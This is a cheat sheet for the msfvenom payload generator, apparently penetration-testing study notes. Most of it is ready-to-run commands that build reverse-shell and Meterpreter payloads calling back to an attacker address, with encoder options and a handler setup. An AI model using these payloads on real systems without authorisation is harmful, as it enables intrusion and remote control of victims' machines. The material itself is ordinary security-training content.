   
# üêç MSFvenom Cheat Notes

## üìå What is MSFvenom?

- Replaces old `msfpayload` + `msfencode`.
    
- Used to **generate payloads** for exploitation.
    
- Supports many **formats** (exe, elf, php, asp, war, etc.) & **targets** (Windows, Linux, Android, iOS).
    

---

## üîç Discover payloads

List all available payloads:

msfvenom -l payloads

```
msfvenom -l payloads
```

---

## üñ®Ô∏è Output formats

List supported output formats:

msfvenom --list formats

```
msfvenom --list formats
```

Examples:

- `-f exe` ‚Üí Windows executable
    
- `-f elf` ‚Üí Linux binary
    
- `-f raw` ‚Üí raw shellcode
    
- `-f python` ‚Üí embed in script
    
- `-f php` ‚Üí PHP webshell
    

---

## üîê Encoders

Used to **encode payloads** (e.g., avoid bad chars), not guaranteed to bypass AV.  
List encoders:

msfvenom -l encoders

```
msfvenom -l encoders
```

Use encoder:

-e x86/shikata_ga_nai -i 5

```
-e x86/shikata_ga_nai -i 5
```

(encode 5 times)

---

## üöÄ Examples

### Linux reverse shell ELF

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
```

### Windows reverse Meterpreter EXE

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```

### PHP reverse shell

msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php
# Edit: add <?php at start and ?> at end

```
msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php
# Edit: add <?php at start and ?> at end
```

### Python shellcode

msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python
```

### Encode example (Base64 for PHP)

msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -e php/base64

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -e php/base64
```

---

## üé£ Setting up the handler

Use multi/handler to catch the shell.

msfconsole
use exploit/multi/handler
set payload php/reverse_php
set LHOST 10.10.10.10
set LPORT 4444
run

```
msfconsole
use exploit/multi/handler
set payload php/reverse_php
set LHOST 10.10.10.10
set LPORT 4444
run
```

‚úÖ Works for all payloads (Windows, Linux, etc.), just change `payload`.

---

## üìù Quick checklist for MSFvenom

‚úÖ Choose payload for target system (check with `msfvenom -l payloads`).  
‚úÖ Set `LHOST` = your IP, `LPORT` = your listening port.  
‚úÖ Decide on output format (`-f`).  
‚úÖ (Optional) encode with `-e encoder -i n`.  
‚úÖ Save payload to file.  
‚úÖ Set up `exploit/multi/handler` in Metasploit.  
‚úÖ Run payload on target, wait for reverse connection.

---

## üí° Tips

- Always check your IP (`ip a`) and firewall rules.
    
- If not connecting, verify:
    
    - Target can reach your LHOST IP + port is open.
        
    - Correct payload architecture (x86 vs x64).
        
- Use `netcat` to test connectivity before trying payload.
    

---